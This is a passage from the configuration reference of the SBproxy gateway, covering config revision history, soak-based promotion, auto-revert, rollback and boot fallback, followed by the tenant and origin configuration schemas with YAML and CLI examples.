| `keep` | int | `20` | Applied entries the ring retains, beyond whichever entry the last-known-good pointer names (that entry is never evicted). Must be at least 1. |
| `keep_rejected` | int | `10` | Refused candidates the ring retains under `rejected/`. Eviction is oldest first, keyed on the most recent refusal, so a candidate an authority is still serving every poll interval is not the one that gets dropped. |
| `soak` | object | see below | The window a newly applied revision must survive before it is promoted to last known good. |
| `boot` | object | see below | What this node does when the config it was told to boot on does not work. |

#### soak

Compiling is not evidence that a config works. A dead upstream URL, a rate
limit of 10 that should have been 10000, an auth block that rejects the
caller carrying most of your traffic, and a WAF rule that matches every
request all compile cleanly. So a committed reload arms a window, four
signals report into it, and only a window that closes on a passing verdict
moves the last-known-good pointer.

| Field | Type | Default | Description |
|---|---|---|---|
| `enabled` | bool | `true` | On by default inside a block that is off by default. A node that recorded revisions but never promoted one would leave the boot fallback with nothing to boot from. |
| `window_secs` | int | `120` | How long a revision must survive before the window closes. Must be at least 1 when the soak is enabled; `POST /admin/config/confirm` short-circuits it. |
| `min_requests` | int | `50` | Fewest requests the window must observe before the request-outcome signal reports anything but `abstain`. |
| `max_error_rate_delta` | float | `0.05` | How far the error rate may rise, against the rate measured when the window armed, before the request-outcome signal fails. Between 0 and 1. |
| `require_no_degraded_subsystems` | bool | `true` | Whether a reload that published while a subsystem stayed on prior state fails its soak. |
| `require_upstream_health` | bool | `true` | Whether an open upstream circuit breaker fails the soak. |
| `auto_revert` | bool | `false` | Whether a failed soak re-applies the last known good on its own. The one key in this block that defaults off. See [auto_revert](#auto_revert). |
| `probe.url` | string | unset | An HTTP `GET` the soak issues on its own cadence. Absent by default. |
| `probe.expect_status` | int | `200` | Status that response must carry. |
| `probe.interval_secs` | int | `10` | Seconds between probe ticks. Must be at least 1. |
| `probe.timeout_ms` | int | `2000` | Per-request timeout. A probe that times out fails the soak; it does not abstain. |

The four signals, and what each of them catches:

| Signal | Source | Catches |
|---|---|---|
| Degraded subsystems | The reload's own outcome | A pipeline that published while the key plane, a sink, or the model runtime stayed on prior state. Reports immediately, so a degraded reload fails without waiting the window out. |
| Upstream health | Per-target circuit breakers, active `health_check:` state, and outlier ejections, across every origin that forwards somewhere | A config that repointed an origin at a dead address, on a node with almost no traffic. It passes only when it could see every forwarding origin: one that declares none of the three exposes nothing, and this abstains rather than reporting health it never looked for. An origin that answers from this process (`static`, `mock`, `echo`, `redirect`, `beacon`) has no upstream at all, so it is neither observed nor unobserved, and a config with no forwarding origin passes vacuously. |
| Request outcome | `sbproxy_requests_total` by status class, plus the upstream retry and timeout counters | A policy that denies everything, an auth block that rejects every caller, a transform that corrupts bodies. |
| Operator probe | `probe:` above, and `proxy.synthetic_probe` when it is running | Whatever you know and the proxy does not. Both feed this one signal, and either of them failing fails it: a passing synthetic run never covers for an operator probe that is failing. A driver that has not produced an outcome yet, or whose outcome is older than its own `stale_after_secs`, abstains rather than failing, because a driver that has said nothing is not evidence against your config. |

The verdict has three states, not two. Argo Rollouts has the one people
forget: an analysis run completes successful, failed, or **inconclusive**,
and inconclusive pauses a rollout rather than promoting or aborting it. A
node that took four requests overnight and 500'd one of them has a 25%
error rate and no information, so below `min_requests` the request-outcome
signal abstains.

| Signals | Verdict | The `lkg` pointer |
|---|---|---|
| Any non-abstaining failure | failed | does not move |
| At least one non-abstaining pass, no failures | passed | advances |
| Every signal abstained | inconclusive | does not move; the entry stays `applied` |

A fifth value appears on `sbproxy_config_soak_verdict_total`:
`superseded`, counted when a newer revision applies mid-soak and the
window in flight is dropped without ever reaching a verdict.

One abstaining signal never blocks a promotion. Every signal abstaining is
different, and promoting on it would be promote-on-apply with two extra
minutes attached. That case gets its own `inconclusive` label on
`sbproxy_config_soak_verdict_total`, because a soak that is not measuring
anything is worth surfacing rather than hiding behind a green promotion.

A clean reload does not promote on its own. `require_no_degraded_subsystems`
is a veto: it can fail a soak and it cannot pass one, for the same reason
this block exists at all. Something that actually observed traffic, an
upstream, or a probe has to be what promotes a revision.

One thing the synthetic driver deliberately cannot do: promote a
revision on a node whose upstreams this soak cannot see. The synthetic
origin is a non-network action by construction, so a passing run proves
the compiled handler chain executes and says nothing about whether any
upstream is reachable. While the upstream-health signal is abstaining
because a forwarding origin exposes no health signal, a synthetic pass is
treated as an absence rather than as evidence, and the window reaches
`inconclusive`. Three things change that, and the `inconclusive` warning
names all three: declare a `probe:` that dials a real upstream, give the
origin a `health_check:`, a `circuit_breaker:`, or an
`outlier_detection:` block, or set `require_upstream_health: false` to
say you are not judging on upstream health at all.

The driver's own origin does not count against you. `proxy.synthetic_probe`
requires a non-network origin, which has no upstream to be blind to, so a
node whose origins are all non-network reaches a real verdict on the
driver alone.

On a node with little organic traffic, turn on `proxy.synthetic_probe`.
Flagger's field experience is the
warning worth copying: a canary that receives no traffic fails its metric
check with "no values found for metric request-success-rate" and eventually
rolls back, and insufficient traffic is documented as the most common cause
of a spurious Flagger rollback. The synthetic driver this proxy already
ships fires an in-process request through the compiled handler chain on a
fixed cadence, and the soak reads its outcome. Be precise about what that
proves: the synthetic origin is a non-network action, so a passing run
proves the chain executes and proves nothing about whether any upstream is
reachable. That is why it sits alongside the upstream-health signal rather
than replacing it, and why an operator who wants a real upstream exercised
still declares `probe.url`.

#### auto_revert

`soak.auto_revert` is the only key in the `soak` block that ships off, and
it is off because it is the only slice of this feature that acts on
production without an operator.

With it off the soak still runs and still promotes. You get a correct
last-known-good pointer, `sbproxy_config_soak_verdict_total`, a
`config_soak_verdict` event, and an alert, and none of the risk. That is
the setting most deployments should run, and running it for a while first
is what lets you calibrate `min_requests` and `max_error_rate_delta`
against your real traffic before handing a node permission to undo a
change nobody asked it to undo. The failure mode is asymmetric: a flapping
upstream during a deploy window reverts a good config, the operator
re-applies it, it reverts again, and now the safety feature is the
incident.

Junos `commit confirmed` is the closest prior art and it is deliberately
not what this is. There the operator opts in per commit, and the rollback
timer is armed for that one change; if the commit is not confirmed within
the window (ten minutes by default) the device rolls back to the previous
configuration on its own. Here the opt-in is per node and standing, which
is a larger promise, so it is off until somebody makes it. The per-change
half of the Junos ergonomic is `POST /admin/config/confirm`, which is
already on.

A failed soak arrives one of two ways and both of them revert. A window
that ran its time and failed reverts when the supervisor closes it. A
reload that published with a subsystem left on prior state fails
immediately, without waiting the window out, and reverts on the
supervisor's next tick about a second later. The second is the common
one: the evidence is already in hand and no traffic is needed to confirm
it.

**Arming is gated by blast radius.** An in-process revert is an arc-swap.
A `Restart` or `Breaking` change (listener ports, the `proxy.admin` block,
cluster identity, an origin's action or auth type) is not something
swapping the pipeline pointer back can undo, and half-reverting one would
leave the process in a state neither configuration describes: the listener
still bound to the port the failing config asked for, the admin server
still holding credentials from the config you rolled away from. So a
failure of that class does not arm. The node logs the radius at WARN and
leaves boot fallback and `POST /admin/config/rollback` as the answer, and
`GET /admin/config/history` shows the radius per revision, so "why did it
not revert" is answerable without reading logs.

Some of that class never reaches a soak at all. `proxy.cluster` and its
subtree are refused outright by the reload transaction's own restart
fingerprint, which names the changed fields and declines to publish, so
those documents never apply and never arm a window. Measured against the
blast-radius matrix: 24 of its 67 rules classify `Restart` or `Breaking`,
the restart fingerprint covers 2 of those 24, and the remaining 22 do
apply and are exactly what the arming gate is for.

Three further refusals, all of which log and none of which retry:

* A revision an earlier automatic revert restored, now failing its own
  soak, escalates instead of reverting to itself. The node has
  demonstrated that both its new configuration and its last known good
  fail the same signals, which is an operator's problem and not something
  a second swap fixes.
* A revert whose document no longer compiles leaves the running pipeline
  serving. Nothing is retried on a timer: a revert that cannot apply once
  will not apply on the next tick, and looping on it would turn one bad
  config into a reload storm.
* An `inconclusive` verdict never reverts. A window where every signal
  abstained measured nothing, and reverting on no information is the false
  positive that gets this switched off.

A revert counts on `sbproxy_config_apply_total{outcome="reverted"}`, which
is disjoint from the `applied` a manual rollback counts, so "did anything
roll this fleet back without an operator" is one query.

Every one of the refusals above counts too, on
`{outcome="declined"}`, and publishes a `config_rollback` event with the
reason. That matters more than it sounds: a change that fails its soak on
every node and is declined on every node leaves the `reverted` counter
flat, which reads exactly like no soak having failed. Alert on
`declined` alongside `reverted`, and read the reason off the event. A
node running the default `auto_revert: false` does not count `declined`,
because it is the default and would drown the signal;
`sbproxy_config_soak_verdict_total{verdict="failed"}` is where an unarmed
node's failed soak shows up.

#### rollback

`POST /admin/config/rollback` re-applies a revision the ring already
holds. It is the escape hatch, and it is needed whatever else is armed.

```bash
# Back to whatever the soak last promoted.
sbproxy config rollback --to last-known-good

# To a specific revision, refusing if somebody else moved this node first.
sbproxy config rollback --to 41 --expected-current 43

# A restart-class rollback needs the revision typed back.
sbproxy config rollback --to 41 --confirm 41
```

A rollback is an **ordinary candidate**. It resolves, it compiles, it
publishes through the same reload transaction every other apply goes
through, and it soaks. Rolling back into a second bad config is a real
thing that happens under pressure, and a privileged path that skipped
validation is how rolling back becomes the incident. Argo Rollouts takes
the other position for container images, letting a promotion back to a
recently running ReplicaSet skip the analysis steps, on the reasoning
that the thing being rolled back to was running minutes ago. That
reasoning does not carry here: this ring keeps revisions for weeks, and a
rollback target from October is not evidence about now.

| Body field | Meaning |
|---|---|
| `revision` | Roll back to this ring revision number. |
| `digest` | Roll back to this content digest. |
| `target` | `"last-known-good"`, the default. An empty body `{}` means this. |
| `expected_current` | Refuse unless this is the revision running now. |
| `lineage` | Refuse unless this is the ring's lineage, absent `force`. |
| `confirm_revision` | Name the target revision back to accept a `restart` or `breaking` rollback. |
| `force` | Proceed across a lineage break. |

`revision`, `digest`, and `target` are mutually exclusive; naming two is a
`400` rather than a silent precedence rule.

`expected_current` is the HAProxy Data Plane API's discipline: it stamps a
version onto the configuration and requires every mutating call to carry
the version it expects, erroring on a mismatch rather than taking
last-writer-wins. Two operators reaching for rollback during the same
incident is not hypothetical, and without it the second silently undoes
the first. Omitting it proceeds, so a caller written before it existed
keeps working.

History stays append-only. A successful rollback **appends** a new entry
carrying the restored document rather than rewinding the ring, so the
rollback is itself visible in history and a second rollback can undo it.
The revision you rolled away from is marked `reverted`, unless there was
nothing to roll away from: rolling back onto the document already running
is deduplicated by the ring, so it appends no entry and marks none
`reverted`. The response says which happened through `appended_revision`.
The last-known-good pointer does not move on a rollback either way: what
is good is whatever a soak promoted, and the rollback's own candidate
soaks like any other before it can become that.

**The node's config file is not rewritten.** The ring holds what this node
applied, and on an authority-owned or git-sourced node the local file is a
pointer rather than the document, so rewriting it would break the
relationship you configured. Every response says so
(`config_file_unchanged`) and names it in `warnings`, because it is the
half of the recovery this route cannot do: the next filesystem event,
SIGHUP, `source:` poll, or authority bundle re-applies whatever the source
of truth still says. Fix the source of truth before then.

Two more things the response carries. A rollback whose stored
`secrets_fingerprint` differs from the one running warns, because the
secret backends moved since that document applied and a `vault://`
reference inside it may resolve to something else now. And a rollback
whose document no longer constructs on this build is refused with the
compile error and the running configuration keeps serving; the refused
candidate is kept under `rejected/` with `rollback` as its stage.

`GET /admin/config/diff?from=<a>&to=<b>` renders a plan between two stored
revisions, or between what is running and one stored revision when `from`
is omitted. Junos has both forms and the second is the one people want
mid-incident (`show | compare rollback n` against one stored revision,
`show system rollback 3 compare 1` between two that need not be adjacent);
Cisco's `show archive config differences` is the same idea. Both sides
accept a revision number or `last-known-good`. It reads: no reload, no
ring write, no pointer move.

```bash
sbproxy config diff 41                 # 41 against what is running
sbproxy config diff --from 38 --to 41  # two stored revisions
```

Rollback is authenticated exactly like `POST /admin/reload` and goes
through the same RBAC gate, so a read-only operator cannot roll a node
back. Every attempt, accepted or refused, publishes a `config_rollback`
event carrying the trigger, the actor, and both revisions, because who
rolled the gateway back and to what is an audit question.

#### boot

`run` used to read the file, resolve `source:`, compile, bind, and exit 1
on any failure. That is right on a first boot, because a node with no
working config has nothing to serve. It is wrong on the thousandth, when
the node served fine for six months, someone pushed a typo, and there is a
perfectly good config sitting in the ring.

| Field | Type | Default | Description |
|---|---|---|---|
| `fallback` | `off` \| `last_known_good` | `off` | What to do when the configured document does not boot. Off by default, so a broken config still exits 1 with the same message unless you ask. |
| `max_attempts` | int | `3` | How many times one ring entry may be tried before it is retired as unbootable. Must be at least 1. |
| `success_secs` | int | `30` | How long a booted process must serve before its entry's boot counter is cleared. |

`--config-fallback <off|last-known-good>` and `SB_CONFIG_FALLBACK` override
this field, in that order of precedence. The flag wins deliberately: a
rescue boot must not depend on the file being right, and the file is what
is broken. A `SB_CONFIG_FALLBACK` value that is neither `off` nor
`last-known-good` is warned about and ignored, and this field decides; a
`--config-fallback` value that is neither refuses to boot, because a flag
typed by hand under pressure with the mode misspelled must not come up
silently with the fallback off.

A node that boots on the fallback says so. It warns at startup, reports
`sbproxy_config_fallback_active` as 1, and answers `GET /admin/config/fallback`
with the revision it is pinned to. A node quietly serving a config nobody
wrote is worse than one that is down, because nobody goes looking for it.

While the pin is in place the file watcher, SIGHUP, and the `source:`
refresh poller are inert. They have to be: the watcher watches the config's
*directory* and re-reads the config path on any event in it, so leaving it
live would re-apply the broken file on the next save in that directory and
loop straight back into the state the fallback just rescued the node from.
Config-authority polling stays live on purpose, because a fleet-wide fix
pushed from the control plane is how this should end.
`DELETE /admin/config/fallback` clears the pin, resumes all three without
a restart, and applies the config file in the same call, so a node whose
file you fixed before clearing does not sit on the rescued revision
waiting for a filesystem event that already happened. While the pin is in
place a local reload is counted as
`sbproxy_config_reload_total{result="suspended"}` and a skipped source
poll as `sbproxy_config_source_fetch_total{result="suspended"}`, rather
than as failures: a pinned node is the state the fallback is supposed to
leave it in, and it must not read as a fault on the dashboard you alert
from.

The ring is trusted by filesystem location, so the boot walk checks that
before it treats ring content as configuration: opening the store proves
the process owns the directory (only an owner may `chmod` it to `0700`),
and any group or other bit on `index.json`, its backup, or a blob refuses
the walk outright.

An entry that was good in October need not construct after an upgrade that
tightened validation, so the walk counts. Borrowing systemd-boot's boot
counting, `boot_attempts` on the entry being tried is incremented on disk
*before* the attempt and cleared once the process has served for
`success_secs`. `max_attempts` failures retire that entry and the walk
moves to the next candidate. The ring is finite and each exhausted
candidate leaves it permanently, so the walk terminates; when it runs out,
the process exits `78` (`EX_CONFIG`) with a message naming every revision
it tried and why each one failed. A first boot with an empty ring exits the
way `off` does, and says the ring was empty rather than pretending a
fallback was attempted.

Every applied revision, whatever triggered it, lands in the ring the same
way: hash the pre-resolution bytes, write the blob, append an entry, then
persist the index (eviction, when `keep` is exceeded, always spares
whichever entry the `lkg` pointer names). Appending never promotes. The
soak window is the only thing that moves the `lkg` pointer, and only on a
passing verdict:

```mermaid
flowchart TD
    A["Config applies\n(boot, reload, or authority publish)"] --> B["SHA-256 the pre-resolution\ndocument bytes"]
    B --> C["Write the blob\nblobs/&lt;digest&gt;.yaml.zst"]
    C --> D["Append a RevisionEntry\nstate: applied, revision N,\nprovenance, blast_radius, actor"]
    D --> E{"Ring holds more than\nkeep entries?"}
    E -->|no| F["Persist index.json.bak,\nthen index.json"]
    E -->|yes| G["Evict the oldest entries\n(never the one lkg names)"]
    G --> F
    F --> H["GET /admin/config/history\nGET /admin/config/history/{digest}"]
    F --> S["Arm the soak window\n(soak.window_secs)"]
    S --> T{"Verdict at window close,\nor at POST /admin/config/confirm"}
    T -->|"passed"| U["state: good,\nlkg pointer advances"]
    T -->|"failed"| V["state: failed,\nlkg pointer does not move"]
    T -->|"inconclusive\n(every signal abstained)"| W["state stays applied,\nlkg pointer does not move"]
    V --> X{"soak.auto_revert armed,\nand the diff hitless or reload class?"}
    X -->|"no (the default,\nor a restart/breaking diff)"| Y["nothing serving changes;\nWARN names the radius"]
    X -->|"yes"| Z["re-apply the lkg blob\nthrough the same transaction"]
    Z --> D
```

A candidate that never applies is kept too, under `rejected/<digest>.json`,
with the reason it was refused, the stage that refused it, the provenance,
and the document as written. The node already knows exactly why it refused
a candidate; before this it became a counter and a log line and then it was
gone. `GET /admin/config/rejected` reads them back, and a repeat refusal of
byte-identical content updates one entry's count rather than filling the
directory with copies. A `reload_busy` skip is not recorded: nothing was
examined, the candidate is retried at the next interval, and a row that
repeats every poll cycle on a healthy node would bury the real refusals.

Each entry stores the pre-resolution config bytes: exactly what was read off
disk, git, or the config authority, before `${VAR}` and
`vault://`/`secret://` references were resolved, compressed with zstd.
`zstdcat` reads one directly off disk while the process is stopped.

That guarantee is about *resolution*, not about what an operator typed. A
`${VAR}` or `vault://`/`secret://` reference never resolves into a stored
entry, but a literal secret pasted directly into the YAML (an inline API
key, a password field) is not a reference and stores exactly as written,
the same way it sits in the config file on disk today. The ring directory
is filesystem-scoped and owner-only (`0700` directory, `0600` files) --
that permission boundary is what actually protects a literal secret at
rest, the same as the config file itself. `GET /admin/config/history/{digest}`
and `sbproxy config show` mask a literal secret as `[REDACTED]` before
either ever leaves the process, the same redaction pass
[`GET /admin/config`](admin-api-reference.md#get-put-adminconfig) applies.
Masking is by recognized credential shape and key name (vendor key
prefixes, `Authorization` values, and the schema's own key / secret /
token / password fields), plus a URL's userinfo, which is masked by
position: `https://user:token@vault.internal:8200` comes back as
`https://[REDACTED]@vault.internal:8200`, host intact. The authority is
matched by an allowlist, `[A-Za-z0-9]` plus `-._~%:@`, which excludes both
`"` and `\` and so cannot leave the JSON string it started in, and
excludes `&`, `=`, `,`, `;` and whitespace and so cannot cross a query
parameter, a logfmt pair or a YAML flow scalar either. `docs/access-log.md`
carries the full reasoning. A secret under a
name or shape the redactor does not recognize is returned as written,
which is one more reason the permission boundary above is the real
control. And it is display
redaction either way: the ring file underneath still holds the
original bytes, because a rollback needs them.

The directory is a one-process durability boundary, not shared fleet state,
the same as [`compression_state`](#compression_state): a config authority
publish can never repoint or clear it.

Enabling or changing config history storage requires restart. The ring
recorder is built once at boot, right after the pipeline publishes; a hot
reload that flips `enabled` from `false` to `true`, or repoints `dir`, does
not open (or reopen) it. Restart the process for a change to this block to
take effect, the same as [`compression_state`](#compression_state).

For what the ring records today, and what it deliberately does not do yet,
see [operator-runbook.md](operator-runbook.md#config-history-ring). The
admin routes that read it back are documented in
[admin-api-reference.md](admin-api-reference.md#get-adminconfighistory).
[`examples/config-history/`](../examples/config-history/) is a runnable
walkthrough: boot, apply a change, read the ring back, and read one
revision's stored document and diff.

### messenger_settings

Not supported. A config that sets `proxy.messenger_settings` fails `serve`,
`validate`, and hot reload with an error explaining why.

Earlier releases accepted this block and built a message bus from it, with a
choice of in-process, Redis, SQS, or GCP Pub/Sub backends. Nothing ever used
that bus. No part of the proxy subscribed to a topic and no part published on
one, so an operator who configured a cluster message bus got a configuration
that loaded cleanly and then carried no events between replicas for the life
of the process. A configuration surface that validates and then does nothing
is worse than one that is absent, because it reads as a working feature. The
block is now refused at load rather than accepted and ignored.

Remove it. If you had it set for one of the two jobs it was documented for,
each has a surface that works:

**Getting configuration to every replica.** Use `proxy.config_authority`. One
node publishes a signed configuration bundle on its own listener and the other
nodes pull it, verify the signature, merge it, and apply it. Subscribers poll
on an interval, hold a cursor, and can be required to have a bundle before they
will boot at all. See [Config authority](#config-authority-fleet-configuration-distribution).

**Invalidating cached responses across replicas.** Point the response cache at
a shared tier with `proxy.l2_cache` and purge it with `POST /admin/cache/purge`
on the admin API. Because the entries live in the shared backend rather than in
each process, a single purge is already fleet-wide; there is nothing to fan
out. The body selects the scope: `{"key": "..."}` for one entry,
`{"prefix": "..."}` for a prefix, an empty body for everything. See
[`l2_cache_settings`](#l2_cache_settings) and
[the admin API guide](admin-api-guide.md).

The bus implementations have been removed from the tree. GCP Pub/Sub and SQS
also acknowledged a message before yielding it, treated any error as a clean
end of stream, and could not stop when their owner was dropped, so a future
consumer cannot bring them back as they were. The block is still accepted by
the parser so that a configuration carrying it gets the explanation above
rather than an unknown-key error, but the rejection is permanent: there is no
backend left for any driver name to select.

---

## Tenants

SBproxy is a multi-tenant gateway. A tenant scope groups an operator's tenant of record (a customer, a deployment slice, a regulatory boundary) so the same proxy binary can serve isolated configurations. Every origin resolves to exactly one tenant; downstream credential resolution (and, through it, the credential a governed request authenticates against) and observability walk origin → tenant → proxy, picking the most specific scope that declares a match. Policy and secret-backend configuration are **not** tenant-scoped: there is no `tenants[].policies:` block (policies stay at origin and proxy-wide scope), and every tenant resolves `vault://`/`secret://` references against the same `proxy.secrets.backends:`. A tenant entry carries exactly three fields: `id`, `credentials`, and `observability`.

For single-tenant deployments the synthetic `__default__` tenant is used implicitly; no operator action is required and existing configs see no behavior change.

```yaml
proxy:
  tenants:
    - id: acme-corp
    - id: beta-corp

origins:
  api.acme.example.com:
    tenant_id: acme-corp
    action:
      type: ai_proxy
      url: https://api.openai.com
  api.beta.example.com:
    tenant_id: beta-corp
    action:
      type: ai_proxy
      url: https://api.anthropic.com
```

### Field schema

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `proxy.tenants[].id` | string | required | Stable identifier. Referenced from `origin.tenant_id` and stamped on every request the origin serves. Max 256 ASCII characters. The literal `__default__` is reserved and cannot be declared. |
| `proxy.tenants[].credentials` | list | `[]` | Tenant-scoped credentials. See [Credentials at the tenant scope](#credentials-at-the-tenant-scope). |
| `proxy.tenants[].observability` | object | | Tenant-scoped `log` (redaction, sinks, custom fields) and `cardinality` (per-tenant metric label budget). See [multi-tenant.md](multi-tenant.md#per-tenant-cardinality-budgets). |

### Resolution rules

- A request matches an origin by hostname. The origin's `tenant_id` (or `__default__`) becomes `RequestContext.tenant_id` for the rest of the request lifecycle.
- An origin that names an undeclared tenant fails config compile so an operator's typo surfaces at startup rather than at request time.
- An empty `proxy.tenants:` list is the same as omitting it; every origin resolves to `__default__`.

### Credentials at the tenant scope

Each tenant can declare its own `credentials:` block alongside the proxy default. Resolution at request time walks origin → tenant → proxy. The same credential `name:` re-declared at a more specific scope shadows the broader scope, so a tenant can override the proxy default key + budget without rewriting the rest. See [migration-credentials.md](migration-credentials.md) for the worked migration from the legacy `virtual_keys:` shape.

---

## Origins

Each key under `origins` is a hostname. When a request arrives, SBproxy matches the `Host` header to an origin key and applies that origin's configuration. Every origin must have an `action` block.

```yaml
origins:
  "api.example.com":
    force_ssl: true
    allowed_methods: [GET, POST, PUT, DELETE]
    action:
      type: proxy
      url: https://backend.internal:8080
```

### Hostname matching

- Exact match: `"api.example.com"` matches only `api.example.com`.
- Wildcard match: a key starting with `*.` matches one or more leading labels. `"*.example.com"` matches `api.example.com` and `a.b.example.com`, but not `example.com` itself.
- Precedence: an exact key always beats a wildcard. Between wildcards, the longest matching suffix wins, so with both `"*.tenant.example.com"` and `"*.example.com"` configured, `api.tenant.example.com` routes to the former and `api.example.com` to the latter. Declaring `"api.example.com"` alongside `"*.example.com"` is legal; the exact key takes that one hostname and the wildcard takes the rest.
- The `*` must be the complete first label. Keys like `a*.example.com`, `api.*.example.com`, or a bare `*` fail config compile.
- Matching compares bytes after the port is stripped from the inbound `Host` (or `:authority`) value. No case folding or IDN normalization is applied, so write keys in lowercase ASCII, which is what clients send; internationalized domains must be keyed in their punycode form.
- Multiple origins: define as many as you need. Each has independent auth, policies, and routing.

### Origin fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `action` | object | required | What to do with the request (proxy, redirect, static, etc.). |
| `tenant_id` | string | `__default__` | Tenant this origin resolves to. Must match a `proxy.tenants[].id`; absent uses the synthetic `__default__` tenant. Stamped on the request context for auth / policy / vault resolution. See [Tenants](#tenants). |
| `credentials` | list | `[]` | Origin-scope credentials. These override or extend credentials inherited from tenant and proxy scopes. |
| `authentication` | object | | Auth provider. Alias: `auth`. |
| `policies` | list | | Policy enforcers (rate limit, IP filter, WAF, etc.). |
| `transforms` | list | | Body transforms applied in order. |
| `request_modifiers` | list | | Header / URL / query / body / script edits before the action. |
| `response_modifiers` | list | | Header / status / body / script edits after the action. |
| `cors` | object | | CORS header injection. |
| `hsts` | object | | HSTS header injection. |
| `compression` | object | | Response compression. |
| `session` | object | | Session cookie settings. Alias: `session_config`. |
| `properties` | object | | Custom request-property capture, redaction, response echo, and bounded durable-rollup promotion. |
| `sessions` | object | | Observability session-ID capture and auto-generation. This is separate from the `session` cookie block. |
| `user` | object | | Observability user-ID capture. |
| `observability` | object | | Per-origin `log.redact.pii` override, composed with tenant or proxy scope. |
| `force_ssl` | bool | false | Redirect plain HTTP requests to HTTPS. |
| `allowed_methods` | list | empty (allow all) | Whitelist of HTTP methods. |
| `forward_rules` | list | | Method, path, header, query, body, and CEL `when` match rules that route to inline child origins. |
| `fallback_origin` | object | | Inline origin served when the primary upstream errors or returns a configured status. See [Fallback origin](#fallback-origin). |
| `response_cache` | object | | Per-origin response cache. |
| `variables` | map | | Static template variables. |
| `on_request` | list | | Webhook callbacks invoked when a request enters the origin. Each entry accepts `url`, `method` (default POST), `secret` (HMAC), `timeout` (seconds), `on_error`. Lua callbacks are also accepted. See [Webhook envelope and signing](#webhook-envelope-and-signing). |
| `on_response` | list | | Same shape as `on_request`; fired after the upstream response is observed. Payload includes `status` and `duration_ms`. |
| `mirror` | object | | Shadow traffic configuration. See [Request mirror](#request-mirror). |
| `bot_detection` | object | | Bot detection config. |
| `threat_protection` | object | | IP reputation / blocklist config. |
| `error_pages` | list | | Custom error pages matching one status code or an explicit list of status codes. |
| `problem_details` | object | | RFC 9457 `application/problem+json` default renderer. Composes with `error_pages`. |
| `proxy_status` | object | | RFC 9209 `Proxy-Status` response-header configuration. |
| `deprecation` | object | | RFC 9745 `Deprecation` + RFC 8594 `Sunset` announcement for every route this origin serves. Also accepted per forward rule, where it overrides this block. See [API deprecation](#api-deprecation-rfc-9745--rfc-8594). |
| `traffic_capture` | object | | Not supported. Setting it fails config load. Use `mirror` for live request mirroring. |
| `message_signatures` | object | | RFC 9421 HTTP message signatures. |
| `olp` | object | | RSL Open License Protocol token issuer and public-key endpoints. `token_rate_limit_per_minute` (default 60, `0` refused) budgets `POST /.well-known/olp/token` per source IP: that endpoint is unauthenticated and mints a bearer license token per call. See [comp-marketplace.md](comp-marketplace.md#the-olp-token-endpoints-budget). |
| `comp` | object | | IAB CoMP marketplace bridge: `/.well-known/iab-comp/{manifest.json,quote,redeem}` on this origin, minting license tokens with the `olp` block's key. Requires `olp.enabled`. See [comp-marketplace.md](comp-marketplace.md). |
| `web_bot_auth_publish` | object | | Publish a Web Bot Auth key directory and Signature Agent Card on this origin. |
| `idempotency` | object | | `Idempotency-Key` middleware. See [Idempotency](#idempotency). |
| `connection_pool` | object | | Only `idle_timeout_secs` is read, as the legacy spelling of `timeouts.idle_ms`. `max_connections` and `max_lifetime_secs` fail config load. See [Connection pool](#connection-pool). |
| `timeouts` | object | | Upstream transport deadlines (connect, read, write, idle), in milliseconds. See [Upstream timeouts](#upstream-timeouts). |
| `extensions` | object | | Opaque map for out-of-tree origin-level blocks. |
| `expose_openapi` | bool | false | Publish this origin's generated OpenAPI document at its well-known paths. |
| `stream_safety` | list | `[]` | Per-origin streaming-safety rule identifiers. |
| `default_content_shape` | string | `html` | Default projection shape when the request has no concrete `Accept` preference. |
| `content_signal` | string | unset | `Content-Signal` value: `ai-train`, `search`, or `ai-input`. |
| `token_bytes_ratio` | number | `0.25` | Markdown token-estimation ratio override. |
| `agent_skills` | list | `[]` | Agent Skills advertisements served from well-known paths. |
| `agents_md` | string | unset | Body served at `/AGENTS.md`. |
| `ai_txt` | string | unset | Body served at `/ai.txt`. |
| `agents_json` | object | unset | Manifest served at `/.well-known/agents.json`. |
| `outbound_credential` | object | unset | Outbound credential exchange, client-credentials, or vault-secret resolver. |
| `outbound_web_bot_auth` | bool | false | Sign upstream requests with `proxy.web_bot_auth`. |

### Origin architecture

Every origin config block supports the fields above as siblings. They sit at the same level as `action`, never inside it:

```yaml
origins:
  "api.example.com":
    action: { ... }              # Required
    authentication: { ... }      # Optional
    policies: [ ... ]            # Optional
    transforms: [ ... ]          # Optional
    request_modifiers: [ ... ]   # Optional
    response_modifiers: [ ... ]  # Optional
    forward_rules: [ ... ]       # Optional
    response_cache: { ... }      # Optional
    variables: { ... }           # Optional
    session: { ... }             # Optional
    properties: { ... }          # Optional request properties
    sessions: { ... }            # Optional observability session IDs
    user: { ... }                # Optional user identity capture
    cors: { ... }                # Optional
    compression: { ... }         # Optional
    hsts: { ... }                # Optional
```

### Request-envelope capture

The `properties`, `sessions`, and `user` blocks capture bounded observability
dimensions at request entry. Their defaults apply even when the blocks are
omitted. The plural `sessions` block controls `X-Sb-Session-Id`; the singular
`session` block above controls encrypted session cookies and is unrelated.

```yaml
origins:
  "api.example.com":
    action: {type: ai_proxy, providers: [{type: openai, api_key: "${OPENAI_API_KEY}"}]}
    properties:
      capture: true
      echo: false
      rollup_keys: [Feature, customer-tier]
      redact:
        keys: [customer-email]
        value_regex: ['\b\d{3}-\d{2}-\d{4}\b']
    sessions:
      capture: true
      auto_generate: anonymous
    user:
      capture: true
      max_length: 256
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `properties.capture` | bool | `true` | Capture bounded `X-Sb-Property-*` headers. |
| `properties.echo` | bool | `false` | Echo captured values as response headers. |
| `properties.redact.keys` | list | `[]` | Lowercased property keys whose values become `[redacted]`. |
| `properties.redact.value_regex` | list | `[]` | Regexes that replace a matching value with `[redacted]`. |
| `properties.rollup_keys` | list | `[]` | Explicit property keys promoted into durable usage-rollup dimensions. At most five. |
| `sessions.capture` | bool | `true` | Capture caller-supplied session and parent-session ULIDs. |
| `sessions.auto_generate` | enum | `anonymous` | `never`, `anonymous`, or `always`. |
| `sessions.ttl_seconds` | int | - | Refused. Setting it fails config load: there is no sessions index to retain. Use `sessions.budget` to bound how many session IDs are minted. |
| `sessions.budget` | object | unset | Optional per-workspace cap for automatically generated session IDs. Caller-supplied IDs are not gated. |
| `user.capture` | bool | `true` | Capture the resolved user identifier. |
| `user.max_length` | int | `256` | Maximum captured user-ID length. |

`properties.rollup_keys` is intentionally explicit and bounded. Compilation
